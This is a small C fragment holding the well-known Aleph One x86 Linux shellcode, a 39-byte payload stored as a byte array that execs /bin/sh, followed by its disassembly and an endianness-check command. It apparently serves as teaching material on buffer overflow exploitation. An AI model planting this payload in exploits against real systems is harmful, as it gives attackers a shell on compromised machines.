/*
 * Aleph One shellcode. 39 bytes shellcode, 48 with bin/sh
 */
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
  
/*/.s
Shellcode to Assembly conversion 
i686 Little Endian

Endianess check : echo -n I | od -to2 | head -n1 | cut -f2 -d" " | cut -c6


0x00000000: jmp 0x21
0x00000002: pop esi
0x00000003: mov dword ptr [esi + 8], esi
0x00000006: xor eax, eax
0x00000008: mov byte ptr [esi + 7], al
0x0000000b: mov dword ptr [esi + 0xc], eax
0x0000000e: mov al, 0xb
0x00000010: mov ebx, esi
0x00000012: lea ecx, dword ptr [esi + 8]
0x00000015: lea edx, dword ptr [esi + 0xc]
0x00000018: int 0x80
0x0000001a: xor ebx, ebx
0x0000001c: mov eax, ebx
0x0000001e: inc eax
0x0000001f: int 0x80
0x00000021: call 2
*/ 